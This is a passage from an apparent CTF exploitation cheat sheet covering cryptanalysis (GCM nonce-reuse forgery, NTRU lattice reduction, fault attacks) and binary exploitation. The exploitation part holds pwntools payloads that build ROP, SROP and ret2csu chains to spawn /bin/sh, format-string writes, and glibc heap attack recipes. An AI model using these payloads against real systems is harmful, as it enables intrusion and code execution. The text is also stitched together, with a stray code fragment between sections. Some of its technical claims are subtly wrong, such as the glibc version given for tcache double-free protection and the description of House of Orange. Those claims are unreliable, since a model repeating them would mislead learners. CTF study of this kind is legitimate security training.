    # Phase 2: Decrypt C with all k2, look up result in table
    
    forward = {}
    for k1 in range(2**56):  # simplified
        forward[encrypt(P, k1)] = k1
    
    for k2 in range(2**56):
        mid = decrypt(C, k2)
        if mid in forward:
            return forward[mid], k2  # possible key pair
    return None

# 3DES MITM: 2^112 attack vs 2^168 brute force
# Splice-and-cut MITM: apply to AES (Biryukov et al.)
```

### Slide Attack (on self-similar ciphers)

```python
def slide_attack_concept():
    """
    Applies when all rounds use SAME subkey (self-similarity).
    
    Key insight: If (P, C) and (P', C') satisfy P' = F(P) and C' = F(C),
    then the cipher "slides" by one round.
    
    Birthday paradox: among 2^{n/2} known PT/CT pairs,
    expect to find a "slid pair" with P' = F(P).
    
    Common target: ciphers with periodic key schedule
    (classic Feistel with identical round keys)
    """
    pass
```

### Related-Key Attacks

```python
def related_key_attack_aes256():
    """
    AES-256 is MORE vulnerable to related-key than AES-128!
    (Irony: longer key = more key schedule rounds = more relations to exploit)
    
    Biryukov-Khovratovich attack on AES-256:
    - Full 14-round related-key recovery: 2^99.5 time, 2^70.5 data
    - 2024 improvement: 13-round attack with lower complexity
    
    Not practical for CTF, but illustrates: longer keys ≠ always better
    """
    pass
```

---

## Lattice Cryptography Deep Dive

### GGH Signature Forgery (Nguyen-Regev Attack)

```python
def ggh_attack_concept():
    """
    GGH scheme:
    - Private key: "good" basis B (short vectors)
    - Public key: "bad" basis H (same lattice, long vectors)
    - Signature: use Babai round-off with good basis
    - Verification: check signature is close to message
    
    Nguyen-Regev attack (2006):
    - Collect N signatures
    - Each signature reveals a random point in the fundamental parallelepiped
    - These points converge to the shape of the secret basis
    - After ~n^2 signatures, recover secret key exactly
    
    Key insight: Signatures LEAK information about the secret basis shape.
    NTRUSign had same vulnerability — retired in favor of hash-based.
    """
    pass
```

### NTRU Key Recovery via Lattice Reduction

```python
def ntru_lattice_attack(h, q, n):
    """
    NTRU public key: h = g/f mod q (ring R = Z[x]/(x^n-1) or cyclotomic)
    Secret key: (f, g) — short polynomials
    
    The NTRU lattice:
    L = [[1, H],
         [0, qI]]  where H = circulant matrix of h
    
    Target: vector (f, g) in L — it's short!
    → LLL/BKZ reduction finds it
    """
    # Build NTRU lattice matrix
    M = Matrix(ZZ, 2*n)
    for i in range(n):
        M[i, i] = 1
    for i in range(n):
        for j in range(n):
            M[i, n+j] = h[(j-i) % n]
    for i in range(n):
        M[n+i, n+i] = q
    
    # Reduce
    M_red = M.BKZ(block_size=20)
    
    # Look for short vectors: (f, g)
    for row in M_red:
        if all(abs(v) < q//4 for v in row):
            f_coeffs = row[:n]
            g_coeffs = row[n:]
            # Verify: reconstruct and check
            # ...
    return None
```

### BKZ Algorithm

```python
BKZ_OVERVIEW = """
BKZ (Block Korkin-Zolotarev) — lattice reduction stronger than LLL.

Parameter: block size β
- β=2: equivalent to LLL
- β=20-30: practical for n ≤ 200
- β=40-60: much stronger, much slower
- β=80+: borderline practical

BKZ calls an SVP oracle on β-dimensional projected sublattices repeatedly.
The SVP oracle itself uses enumeration (exponential in β) or sieving.

Time complexity: 2^{O(β)} for SVP, polynomial in n for rest.
Output quality: ||b1|| ≤ (γ_β)^{(n-1)/(β-1) + 3/2} · λ_1(L)

For CTF: Use SageMath's M.BKZ(block_size=β) or flatter/fpylll for speed.
"""
```

---

## Authenticated Encryption Attacks

### GCM Nonce Reuse — The Forbidden Attack

```python
def gcm_forbidden_attack(ciphertexts_with_same_nonce):
    """Complete break of AES-GCM when nonce is reused.
    
    GCM authentication tag:
    T = GHASH(H, A, C) ⊕ E_K(J0)
    
    GHASH(H, A, C) computes:
    g(X) = A_1*X^{m+n+1} + ... + A_m*X^{n+2} + C_1*X^{n+1} + ... + C_n*X^2 + L*X
    
    With two messages (same H, same J0):
    T1 ⊕ T2 = GHASH(H, A1, C1) ⊕ GHASH(H, A2, C2)  (E_K(J0) cancels!)
    
    This gives a polynomial in H (authentication key):
    g1(H) - g2(H) - (T1 ⊕ T2) = 0 (mod field)
    
    Find roots → H
    Then compute E_K(J0) = T1 ⊕ GHASH(H, A1, C1)
    Now forge any message's tag!
    """
    from sage.all import GF, PolynomialRing
    
    # Field: GF(2^128) with GCM polynomial
    F = GF(2**128, 'a', modulus=0xE1000000000000000000000000000000)
    
    def bytes_to_field(b):
        return F.from_integer(int.from_bytes(b, 'big'))
    
    def field_to_bytes(f, n=16):
        return f.to_integer().to_bytes(n, 'big')
    
    def ghash(h, aad, ct):
        """Compute GHASH for GCM."""
        # Pad AAD and ciphertext to block boundaries
        blocks = []
        for b in [aad, ct]:
            blocks.extend(b[i:i+16] for i in range(0, len(b), 16))
        # Length block
        L = (len(aad) * 8).to_bytes(8, 'big') + (len(ct) * 8).to_bytes(8, 'big')
        blocks.append(L)
        
        y = F(0)
        for block in blocks:
            y = (y + bytes_to_field(block)) * h
        return y
    
    def recover_auth_key(ct1, ct2, tag1, tag2, aad1, aad2):
        """Recover H (auth key) from two messages with same nonce."""
        # Polynomial: ghash(H, aad1, ct1) + ghash(H, aad2, ct2) + (tag1^tag2) = 0
        H = PolynomialRing(F, 'H').gen()
        
        # Construct polynomial by evaluating GHASH symbolically
        poly = ghash(H, aad1, ct1) + ghash(H, aad2, ct2) + bytes_to_field(xor_bytes(tag1, tag2))
        
        # Find roots
        roots = poly.roots()
        return [r[0] for r in roots]
```

### Poly1305 Repeated-Nonce Attack

```python
def poly1305_nonce_reuse():
    """
    ChaCha20-Poly1305 and AES-GCM-SIV use Poly1305.
    If nonce is reused:
    - For two messages: r can be recovered from (C1-MAC1) and (C2-MAC2)
    - This breaks authenticity entirely
    
    Poly1305 is a one-time authenticator — strictly requires UNIQUE nonce per message.
    """
    pass
```

### CCM Nonce Reuse

```python
def ccm_nonce_reuse():
    """
    CCM (CBC-MAC + CTR):
    Nonce reuse → same keystream → XOR plaintexts leaked
    Plus: CBC-MAC collisions reveal MAC key structure
    Less studied than GCM but equally broken on nonce reuse
    """
    pass
```

---

## Side-Channel & Fault Attacks

### Differential Power Analysis (DPA) on AES

```python
def dpa_aes_theory():
    """
    Core principle: Power consumption correlates with Hamming weight of
    intermediate values during encryption.
    
    Attack on AES:
    1. Collect N power traces T_i[t] for known plaintexts P_i
    2. For each key byte guess k (0-255):
       a. Compute intermediate: S-box(P_i[byte] ⊕ k) after first round
       b. Predict power: Hamming weight of intermediate
       c. Correlate predicted power with actual traces at each time point
    3. Key byte with highest correlation peak is correct
    
    Number of traces needed: ~50-200 for unprotected AES-128 (SW),
    ~1K-10K for protected implementations.
    """
    pass

def cpa_vs_dpa():
    """
    Correlation Power Analysis (CPA) — more efficient than classic DPA:
    Uses Pearson correlation coefficient between predicted power model
    and actual measurements.
    
    Template Attack — strongest profiling attack:
    1. Profile phase: capture traces for known keys on IDENTICAL device
    2. Build multivariate Gaussian models per key value
    3. Attack phase: match new trace to closest template
    
    Single trace can recover key with good templates!
    """
    pass
```

### Differential Fault Analysis (DFA) on AES

```python
def dfa_aes():
    """
    Inject a fault (glitch/laser/EM pulse) during AES encryption,
    compare correct vs faulty ciphertext to recover key.
    
    Classic DFA on AES (Piret-Quisquater):
    1. Inject fault into state BEFORE MixColumns of round 8
    2. This affects exactly 1 byte of state → 4 bytes of round 9 output
    3. The differential propagates through MixColumns to 4 bytes of ciphertext
    
    Fault model: single byte flip at known/unknown position
    
    For a single fault:
    - If fault in diagonal 0: affects ciphertext bytes 0, 7, 10, 13
    - Known differential + inverse S-box → recover 4 key bytes
    - 4-8 faults → full key recovery
    
    Implementation:
    1. Get correct ciphertext C
    2. Get faulty ciphertext C' (same plaintext, fault injected)
    3. For each possible fault position (0-15):
       - Compute differential Δ = C ⊕ C'
       - Back-propagate through inverse ShiftRows, inverse MixColumns
       - Check which fault byte explains the differential
       - Recover round-10 key byte
    """
    pass

# RSA Fault Attack (Bellcore attack)
def rsa_bellcore_attack():
    """
    CRT-RSA: sign with both p and q using Chinese Remainder Theorem
    Fault one of the two exponentiations:
    
    Correct: S = CRT(S_p, S_q) where S_p = m^d mod p, S_q = m^d mod q
    Faulty: S' = CRT(S_p', S_q) where S_p' ≠ m^d mod p (fault injected)
    
    Then: S - S' is divisible by q but NOT by p
    → gcd(S - S', N) = q → factor N!
    
    SINGLE faulty signature can break RSA-CRT.
    Countermeasure: verify signature before output (S^e mod N == m)
    """
    pass

# Safe-Error Attack
def safe_error_attack():
    """
    Inject fault during dummy operations:
    - If operation was real → error detected → output suppressed
    - If operation was dummy → no error → normal output
    
    This reveals which operations are real vs dummy,
    breaking implementations with dummy operations for side-channel protection.
    """
    pass
```

---

## ZKP & Protocol Attacks

### Fiat-Shamir Transformation Vulnerabilities

```python
def fiat_shamir_attacks():
    """
    The Fiat-Shamir transform converts interactive Σ-protocols to non-interactive
    by computing challenge = Hash(statement, commitment).
    
    Vulnerabilities:
    1. **Missing statement in hash**: challenge = Hash(commitment) only
       → Can precompute fake proofs by choosing commitment AFTER challenge
    
    2. **Weak Fiat-Shamir**: Hash omits some public inputs
       → Freezing Heart attack on Helios voting
       → Last Challenge attack on zkSNARKs
    
    3. **Last Challenge Attack**: If verifier accepts multiple proofs,
       and challenges are predictable → forge proof by solving backward
    
    4. **Incorrect domain separation**: Using same hash for different proof types
    
    Fix: Strong Fiat-Shamir — Hash(statement, context, all commitments)
    """
    pass

def last_challenge_attack_zkSNARK():
    """
    If verifier accepts batch proofs and challenges are predictable:
    - Generate malicious setup
    - Compute witness that satisfies relation with the predictable challenge
    - No knowledge needed!
    
    Prevented by: full domain separation, context binding, unpredictable challenges
    """
    pass
```

---

## Quantum & Post-Quantum

### Shor's Algorithm Impact

```python
def shor_algorithm_impact():
    """
    Shor's algorithm factors N in O((log N)³) quantum operations.
    
    Broken by Shor:
    - RSA (reduces to factoring)
    - DSA/ECDSA (reduces to discrete log)
    - Diffie-Hellman / ECDH (discrete log)
    - ElGamal
    - All elliptic curve crypto (ECDSA, EdDSA, ECDH...)
    
    Key sizes needed for classical security vs quantum:
    | Classic Security | RSA Key | ECC Key | AES Key |
    |:-----------------|:--------|:--------|:--------|
    | 128-bit          | 3072    | 256     | 128     |
    | Post-quantum     | BROKEN  | BROKEN  | 256*    |
    
    * Grover's algorithm gives quadratic speedup: AES-128 → 64-bit security
      → Use AES-256 for 128-bit post-quantum security
    """
    pass

def grover_algorithm():
    """
    Grover's algorithm: search unsorted database of N items in O(√N) time.
    
    Impact on symmetric crypto:
    - AES-128: 2^64 quantum operations → 64-bit security margin (too low)
    - AES-256: 2^128 quantum operations → 128-bit security (acceptable)
    - SHA-256 preimage: 2^128 quantum → 128-bit (acceptable)
    
    NIST recommendation: AES-256 + SHA-384 for post-quantum security.
    """
    pass

def harvest_now_decrypt_later():
    """
    "Store now, decrypt later" attack:
    - Adversaries collect encrypted traffic TODAY
    - Store it until quantum computers are available
    - Decrypt it then
    
    Impact: Data with long-term secrecy (gov't, medical, financial) needs
    post-quantum protection NOW, not when quantum computers arrive.
    
    Estimated timeline: "Q-Day" 2030-2040 (controversial; 500K physical qubits needed).
    """
    pass
```

---

## Blockchain & Cryptocurrency Crypto

### ECDSA Nonce Attack on Bitcoin

```python
def bitcoin_nonce_attack():
    """
    Bitcoin uses ECDSA on secp256k1.
    
    Known attacks on blockchain:
    1. **Nonce reuse**: Same k for two transactions → private key recovery
       (Several real cases; e.g., Sony PS3, Blockchain.info bug 2015)
    
    2. **RFC 6979 violations**: Deterministic nonce from RFC 6979
       anchors security to HMAC_DRBG — no randomness needed after key gen
    
    3. **Biased nonces**: If nonces have detectable bias (e.g., top bits are 0),
       lattice attack (HNP) recovers private key from ~100 signatures
    
    4. **Weak random**: Android SecureRandom bug (2013) led to repeat nonces
       → ~55 BTC stolen within days
    
    5. **Transaction malleability**: Pre-SegWit, signature could be modified
       (s → n-s) without invalidating → different txid → double-spend confusion
    """
    pass
```

### Merkle Tree Attacks

```python
def merkle_tree_attacks():
    """
    1. **Second preimage via tree structure**: If tree depth is known,
       construct intermediate node as leaf → different tree, same root
    
    2. **CVE-2012-2459 Bitcoin**: Block Merkle root didn't distinguish
       between leaves and internal nodes → can fake transactions
    
    3. **SPV proof manipulation**: Send partial tree → client accepts invalid tx
    
    Fix: Use tagged hashes (e.g., leaf = Hash(0x00 || data), node = Hash(0x01 || L || R))
    """
    pass
```

---

## Historical Ciphers & Specialized Attacks

```python
# RC4 — Broken (multiple biases)
def rc4_attacks():
    """
    Key biases:
    - 2nd byte is 0 with prob 2/256 (vs 1/256 expected)
    - Multiple long-term biases: Mantin's ABSAB bias, Fluhrer-McGrew biases
    - WEP completely broken: 40K-85K packets → key recovery (FMS attack, 2001)
    - TLS: 2^26 sessions needed for plaintext recovery (AlFardan et al., 2013)
    
    Status: RFC 7465 — MUST NOT use RC4 in TLS (2015)
    """
    pass

# DES — Broken (small key + differential)
def des_attacks():
    """
    - Single DES: 2^56 brute force → cracked in <24h (since 1998, Deep Crack)
    - Linear cryptanalysis: 2^43 known plaintexts (Matsui, 1994)
    - Improved Davies-Murphy: even fewer
    
    - Triple DES: 112-bit security with MITM → 2^112 (still acceptable but slow)
    """
    pass

# MD5 — Completely broken
def md5_attacks():
    """
    - Collision: 2^18 time (Xie & Feng, 2009) — SECONDS on laptop
    - Chosen-prefix collision: practical (used in Flame malware, 2012)
    - PS: MD5 is not even a hash function anymore, it's a "suggestion function"
    """
    pass

# SHA-1 — Broken
def sha1_attacks():
    """
    - Collision: 2^63.1 (SHAttered, 2017) — 6500 CPU-years + 110 GPU-years
    - Chosen-prefix: 2^63.4 (Leurent & Peyrin, 2020) — 2^63.4
  
    Status: Deprecated everywhere. Use SHA-256 minimum.
    """
    pass
```
    
    return plaintext
```

---

## REVERSE ENGINEERING

### Quick Analysis

```bash
# File identification
file binary
strings binary | grep -i flag
strings binary | grep -i ctf
strings binary | grep -i pass

# Check binary security
checksec --file=binary
# Check for: PIE, NX, Stack Canary, RELRO, FORTIFY

# Dynamic analysis
ltrace ./binary  # library calls
strace ./binary  # system calls
```

### Common Obfuscation Patterns

```python
# XOR string deobfuscation
def deobfuscate_xor_strings(data: bytes, start_pattern: bytes = b'\\x48\\x8d'):
    """Find and deobfuscate XOR-encoded strings in binaries."""
    import re
    
    strings = []
    for i in range(len(data)):
        # Look for common string loading patterns
        if data[i:i+2] == start_pattern:
            # Extract string from nearby bytes
            pass
    
    return strings

# Base64 decode from binary
def extract_base64_from_binary(filepath: str) -> list:
    """Extract base64 strings from binary."""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    import re
    pattern = re.compile(b'[A-Za-z0-9+/]{20,}={0,2}')
    matches = pattern.findall(data)
    
    import base64
    decoded = []
    for m in matches:
        try:
            decoded.append(base64.b64decode(m))
        except:
            pass
    
    return decoded
```

### Python Bytecode Reversing

```python
# Decompile .pyc files
# Use uncompyle6 or pycdc

# Common Python obfuscation:
# - marshal + base64 + exec
# - eval with encoded strings
# - lambda obfuscation
# - zlib compressed code

import marshal
import base64
import zlib

def deobf_python_common(code_str: str):
    """Try common Python obfuscation unwrapping."""
    
    # Try base64 → marshal
    try:
        decoded = base64.b64decode(code_str)
        obj = marshal.loads(decoded)
        return obj
    except:
        pass
    
    # Try base64 → zlib → marshal
    try:
        decoded = base64.b64decode(code_str)
        decompressed = zlib.decompress(decoded)
        obj = marshal.loads(decompressed)
        return obj
    except:
        pass
    
    return None
```

### Ghidra/Radare2 Quick Commands

```bash
# r2 quick analysis
r2 -A binary     # Analyze all
> afl            # List functions
> s main         # Seek to main
> pdf            # Print disassembly
> iz             # List strings
> axt <addr>     # Cross-references to address

# Find "flag" references
r2 -q -c '/ flag' binary
r2 -q -c 'izz | grep flag' binary
```

---

## PWN / BINARY EXPLOITATION

### Quick Setup

```python
from pwn import *

# Set context
context.arch = 'amd64'  # or 'i386', 'arm'
context.os = 'linux'
context.log_level = 'debug'

# Connect to remote
# r = remote('challenge.ctf', 1337)
# Or local:
# r = process('./binary')
```

### Buffer Overflow Patterns

```python
# Find offset to return address
# Use cyclic pattern
pattern = cyclic(200)
# After crash: cyclic_find(0x61616174)  # find offset

# x86_64 ROP chain to call system("/bin/sh")
# Find gadgets:
# ROPgadget --binary ./vuln | grep "pop rdi"
# ROPgadget --binary ./vuln | grep "ret"
# ROPgadget --binary ./vuln | grep "pop rsi"

POP_RDI = 0x400123  # pop rdi; ret
BIN_SH = 0x400200   # address of "/bin/sh" string
SYSTEM = 0x400456   # address of system@plt
RET = 0x400101      # ret (stack alignment)

payload = b'A' * offset
payload += p64(RET)      # stack alignment
payload += p64(POP_RDI)
payload += p64(BIN_SH)
payload += p64(SYSTEM)
```

### Format String Attacks

```python
# Read from arbitrary address: %s with pointer on stack
# Write to arbitrary address: %n

# Leak canary with format string
fmt_read_payload = b'%p.' * 20  # dump stack values

# Write value to address using format string
# Use pwntools fmtstr_payload
from pwn import *
writes = {target_addr: value_to_write}
payload = fmtstr_payload(offset, writes, numbwritten=0)
```

### Heap Exploitation — Complete Reference

#### GLIBC Heap Internals

```python
# Chunk structure (x86_64, glibc 2.35+)
"""
malloc_chunk:
  prev_size  (8 bytes) — size of previous chunk (if free)
  size       (8 bytes) — size | flags (bit 0=PREV_INUSE, bit 1=IS_MMAPPED, bit 2=NON_MAIN_ARENA)
  fd         (8 bytes) — forward pointer (when free)
  bk         (8 bytes) — backward pointer (when free)
  user data  (variable)
"""

# Bin types
BINS = {
    'tcache':  'Per-thread, LIFO, 7 entries per size [0x20-0x410], no integrity checks (glibc 2.26+)',
    'fastbin': 'LIFO, singly-linked, 10 bins [0x20-0xb0], chunks not consolidated, simple size check',
    'smallbin': 'FIFO, doubly-linked, 62 bins [0x20-0x3f0], exact fit only',
    'largebin': 'FIFO, doubly-linked + skip list, 63 bins [0x400+], ranges, sorted by size',
    'unsortedbin': 'Circular doubly-linked, cache for freed chunks, sorted into small/large on next malloc',
}
```

#### Tcache Attacks (glibc 2.26-2.39+)

```python
# Tcache entry: singly-linked, max 7 per size, no integrity check (pre-2.39)
# glibc 2.39+ adds: tcache_key (guard against double free)

# Tcache Poisoning (overwrite fd to get malloc at arbitrary addr)
def tcache_poisoning():
    """
    1. Allocate chunk A (size S)
    2. Free chunk A → A goes to tcache[S]
    3. Overflow/Use-after-free: overwrite A's fd with target_addr
    4. malloc(S) → returns A
    5. malloc(S) → returns target_addr (poisoned!) → write anything there
    """
    pass

# Tcache Double Free (pre-2.39: no key check)
def tcache_double_free():
    """
    glibc < 2.39: simply free same chunk twice
    glibc ≥ 2.39: tcache_key stored at offset +8, checked on free
    Bypass: overwrite/clear tcache_key between frees
    """
    pass

# Tcache House of Spirit
def house_of_spirit_tcache():
    """
    Fake a chunk on stack (or any controlled memory) with valid size.
    Free the fake chunk → it enters tcache.
    malloc returns pointer to our controlled memory → write ROP chain.
    
    Requirements: valid size and next chunk's PREV_INUSE bit
    """
    pass

# Tcache Stashing Unlink Attack (smallbin → tcache)
def tcache_stashing_unlink():
    """
    When smallbin chunk is allocated, remaining chunks are "stashed" into tcache.
    If we corrupt a smallbin chunk's bk, the stashing writes a main_arena
    address to an arbitrary location → write-what-where primitive!
    
    1. Fill tcache for target size
    2. Put 2+ chunks in smallbin
    3. Corrupt bk of last smallbin chunk to target - 0x10
    4. malloc triggers stashing → target gets a libc address written
    """
    pass
```

#### Fastbin Attacks

```python
# Fastbin Dup (Double Free)
def fastbin_dup():
    """
    1. malloc(A, size=fastbin_range)
    2. malloc(B, size=fastbin_range)  # guard chunk
    3. free(A)
    4. free(B)
    5. free(A)  ← double free!
    Now: A → B → A → ...
    6. malloc → A; overwrite A's fd → target
    7. malloc → B
    8. malloc → A (again)
    9. malloc → target!
    """
    pass

# Fastbin Dup Consolidate (bypass double-free check)
def fastbin_dup_consolidate():
    """
    Uses malloc_consolidate to move fastbin chunks to smallbin,
    resetting the fastbin double-free detection.
    
    1. free(A) → fastbin
    2. Allocate a large chunk (>0x400) → triggers consolidation
       A moves to smallbin → double-free check cleared
    3. free(A) → fastbin again!
    """
    pass

# Fastbin Reverse into Tcache
def fastbin_reverse_into_tcache():
    """
    Allocating from fastbin when tcache is not full:
    remaining fastbin chunks are moved to tcache (LIFO→LIFO reversal).
    Can be used to get overlapping allocations.
    """
    pass
```

#### Unsorted Bin Attack

```python
def unsorted_bin_attack():
    """
    Classic (patched in glibc 2.29+): 
    Overwrite unsorted bin chunk's bk → malloc writes main_arena+88 to target+0x10
    
    glibc 2.29+ mitigation: checks bk->fd == chunk → blocks naive overwrite
    Bypass: find a location where (target+0x10) points to a valid-looking chunk
    """
    pass

# Unsorted Bin → Libc Leak
def leak_libc_via_unsorted_bin():
    """
    When a chunk is the ONLY one in unsorted bin:
    fd and bk both point to &main_arena.top (inside libc)
    
    1. malloc(A, 0x420)  # large enough for unsorted bin
    2. malloc(B, 0x20)   # guard to prevent consolidation with top
    3. free(A) → A goes to unsorted bin
    4. A's fd and bk now point to main_arena+96 (libc address!)
    5. Leak fd/bk via UAF or OOB read
    6. Subtract known offset → libc base
    """
    pass
```

#### House Of Series (Complete)

```python
HOUSE_OF = {
    'force': """
        Overwrite top chunk size to very large value (e.g., -1).
        Then: malloc(negative_number) wraps around heap → returns target address.
        Patched: glibc 2.29+ checks top chunk size sanity.
        Still works if manual size validation is weak.
    """,
    
    'spirit': """
        Free a fake chunk (stack/bss/heap) with valid metadata.
        Next malloc returns pointer to fake location.
        Requires: valid size field, next chunk's PREV_INUSE bit, prev_size consistency.
    """,
    
    'lore': """
        Uses smallbin/largebin chunk corruption + unsorted bin attack.
        Overwrite _IO_list_all → trigger FSOP via malloc failure.
        Patched in glibc 2.28 (checks bk→fd in unsorted bin).
    """,
    
    'orange': """
        Same as House of Lore but with FILE struct vtable check bypass.
        Uses _IO_str_jumps or _IO_wstr_jumps for vtable bypass.
        FSOP: corrupt FILE struct → when program exits → _IO_flush_all_lockp.
    """,
    
    'einherjar': """
        Exploits off-by-one null byte to create overlapping chunks.
        1. Allocate A, B, C (sizes chosen so B has PREV_INUSE flag)
        2. Free A → unsorted bin or large bin
        3. Off-by-one: overwrite B's PREV_INUSE to 0, set prev_size = A+B size
        4. Free B → consolidates backward into fake large chunk → overlaps C
    """,
    
    'botcake': """
        Tcache + unsorted bin: free 7 chunks into tcache (fill it),
        then free 2 chunks into unsorted bin. They consolidate.
        UAF on overlapped chunk → leak & write.
        Bypasses tcache double-free protections.
    """,
    
    'pig': """
        Uses largebin attack + tcache stashing + FSOP.
        1. Put chunk in largebin (with controlled size fields)
        2. Largebin insert writes arbitrary address
        3. Trigger FSOP for code execution
    """,
    
    'apple_1': """
        FSOP via _IO_wfile_overflow path.
        Requires controlled FILE struct + valid vtable pointer to _IO_wfile_jumps.
        Calls _IO_wdoallocbuf → wide char buffer → controlled function pointer.
    """,
    
    'apple_2': """
        FSOP via _IO_wfile_underflow + _IO_switch_to_wget_mode.
        Sets up wide character FILE struct to call arbitrary function.
        More complex than apple_1 but works on newer glibc.
    """,
    
    'apple_3': """
        Abuses _IO_cleanup → _IO_flush_all_lockp → _IO_OVERFLOW vtable call.
        No need for __malloc_hook/__free_hook.
        Target: corrupt stderr/stdout FILE struct.
    """,
    
    'banana': """
        FSOP via _IO_wfile_seekoff → _IO_switch_to_wget_mode path.
        Alternative to apple family for newer glibc versions.
    """,
    
    'kiwi': """
        Abuses _IO_helper_overflow via tcache poisoning.
        Chain: corrupt tcache → allocate over _IO_helper_jumps → control execution.
    """,
    
    'emma': """
        Tcache poisoning + FSOP without needing libc leak.
        Uses relative overwrite in tcache to point to FILE structs.
    """,
}
```

#### Heap Exploit Primitives

```python
# Overlapping chunks (classic)
def create_overlap():
    """
    1. Alloc A(size=0x100), B(size=0x100), C(size=0x100)
    2. Free B
    3. Off-by-one on A: overwrite B's size from 0x111 to 0x211 (covering C)
    4. Alloc D(size=0x200) → D overlaps C!
    5. Modify C through its original pointer → affect D
    """
    pass

# Heap Feng Shui / Grooming
def heap_feng_shui():
    """
    Control heap layout for exploitation:
    1. Spray allocations of target size
    2. Free in alternating pattern (create holes)
    3. UAF/write to place target chunk precisely
    
    Key: tcache bin count manipulation (fill to 7 to force other bins)
    """
    pass

# Safe Linking Bypass (glibc 2.32+)
def safe_linking_bypass():
    """
    glibc 2.32+: fd/bk pointers are XOR'd with (chunk_addr >> 12)
    To forge a pointer to TARGET:
    fd_fake = (chunk_addr >> 12) ^ TARGET
    
    Need to know/leak heap address (or use bruteforce on 4 bits).
    """
    pass
```

---

## Advanced Stack Exploitation

### ret2dlresolve — Dynamic Linker Exploitation

```python
def ret2dlresolve_exploit():
    """
    Trick the dynamic linker into resolving a fake symbol (e.g., "system").
    Works WITHOUT knowing libc base! (Uses original PLT stub.)
    
    Step 1: Forge a fake Elf64_Rela relocation entry
    Step 2: Forge a fake Elf64_Sym symbol entry (pointing to string "system")
    Step 3: Call PLT[0] (the resolver stub) with our fake relocation index
    
    pwntools helper:
    """
    from pwn import *
    
    elf = ELF('./binary')
    rop = ROP(elf)
    
    # Create fake structures on stack/BSS
    dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
    rop.read(0, dlresolve.data_addr)  # write fake structures
    rop.ret2dlresolve(dlresolve)      # trigger dl-resolve
    
    # Key offsets (x86_64):
    # Elf64_Rela: r_offset(8) + r_info(8) + r_addend(8) = 24 bytes
    # Elf64_Sym: st_name(4) + st_info(1) + st_other(1) + st_shndx(2) + st_value(8) + st_size(8) = 24 bytes
    # Align to 0x10/0x8 for bypassing version checks
    pass
```

### SROP — Sigreturn-Oriented Programming

```python
def srop_exploit():
    """
    When you can control RAX (set to 15 = __NR_rt_sigreturn on x86_64)
    and have a syscall gadget:
    
    sigreturn restores ALL registers from a SigreturnFrame on the stack.
    Frame size: 248 bytes (x86_64).
    
    Single gadget → full register control → execve('/bin/sh', 0, 0)!
    """
    from pwn import *
    
    context.arch = 'amd64'
    
    # Build sigreturn frame
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve
    frame.rdi = bin_sh_addr   # pointer to "/bin/sh"
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_addr  # syscall gadget
    
    # Setup: RAX=15, then syscall
    # Option 1: pop_rax + syscall gadget
    # Option 2: read syscall (read 15 bytes from stdin to set RAX)
    
    payload = b'A' * offset
    payload += p64(pop_rax_ret)
    payload += p64(15)         # SYS_rt_sigreturn
    payload += p64(syscall)    # syscall
    payload += bytes(frame)    # fake signal frame
```

### Stack Pivot

```python
def stack_pivot():
    """
    When buffer overflow is too small for full ROP chain:
    Migrate RSP to a controlled area (BSS, heap, known writable).
    
    Gadgets:
    - leave; ret  [mov rsp, rbp; pop rbp; ret]
    - pop rsp; ret
    - xchg rsp, rax; ret (if RAX controlled)
    
    Technique:
    1. Write fake RBP → target_stack_area - 8
    2. Overwrite return address → leave; ret gadget
    3. leave: rsp = rbp = target_stack_area - 8; pop rbp; ret
    4. Now executing ROP chain from target_stack_area!
    """
    pass

# Common pivot gadgets
STACK_PIVOT_GADGETS = [
    'leave; ret',           # mov rsp,rbp; pop rbp; ret
    'pop rsp; ret',         # direct
    'xchg rax, rsp; ret',   # if rax controlled
    'add rsp, X; ret',      # skip to controlled data
]
```

### ret2csu — __libc_csu_init Gadgets

```python
def ret2csu_exploit():
    """
    When gadget variety is limited (small binary), use __libc_csu_init:
    
    Gadget 1 (0x4006a0): pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
    Gadget 2 (0x400680): mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
    
    Chain:
    1. Use gadget1 to set: r12=edi, r13=rsi, r14=rdx, r15=function_ptr, rbx=0, rbp=1
    2. Jump to gadget2 → calls our function with controlled args!
    3. After call: add rbx,1; cmp rbp,rbx; jne loop. With rbx=0,rbp=1 → falls through to ret
    """
    from pwn import *
    
    csu_pop = 0x4006a0
    csu_call = 0x400680
    
    # Call system("/bin/sh") via ret2csu
    payload = b'A' * offset
    payload += p64(csu_pop)
    payload += p64(0)               # rbx = 0
    payload += p64(1)               # rbp = 1
    payload += p64(bin_sh_addr)     # r12 → edi (actually uses r12d low 32 bits)
    payload += p64(0)               # r13 → rsi
    payload += p64(0)               # r14 → rdx
    payload += p64(got_system)      # r15 → [r15+rbx*8] = got['system']
    payload += p64(csu_call)        # call system("/bin/sh")
    payload += p64(0) * 7           # padding after ret2csu
```

### Blind ROP

```python
def blind_rop():
    """
    When binary has no symbols, no libc info, and output is binary (crash/no crash):
    
    BROP technique:
    1. Find STOP gadget (ret-like behavior)
    2. Find BROP gadget (pop rdi/rsi/rdx + ret) via syscall side effects
    3. Leak binary via write(1, binary_addr, size) — crash/no-crash oracle
    4. Find PLT entries and build full exploit
    
    Phase 1 — Find STOP gadget:
    - Overwrite 1 byte of return addr; if program exits cleanly (vs crash), it's ret
    
    Phase 2 — Find pop gadgets:
    - Chain: candidate + trap(0xdead) + STOP
    - If program pauses (blocked on read/network) → candidate is pop + trap
    
    Phase 3 — Leak binary:
    - write(1, addr, 1) → observe program behavior for each byte value
    - 1 bit per attempt → 8 attempts per byte (or binary search)
    """
    pass
```

---

## FSOP — File Stream Oriented Programming

### FILE Structure Layout

```python
"""
_IO_FILE (x86_64):
  +0x00: _flags          (4 bytes)  — MUST have _IO_MAGIC (0xFBAD0000) + appropriate flags
  +0x08: _IO_read_ptr    (pointer)
  +0x10: _IO_read_end    (pointer)
  +0x18: _IO_read_base   (pointer)
  +0x20: _IO_write_base  (pointer)
  +0x28: _IO_write_ptr   (pointer)
  +0x30: _IO_write_end   (pointer)
  +0x38: _IO_buf_base    (pointer)
  +0x40: _IO_buf_end     (pointer)
  +0x48: _IO_save_base   (pointer)
  +0x50: _IO_backup_base (pointer)
  +0x58: _IO_save_end    (pointer)
  +0x60: _markers        (pointer)
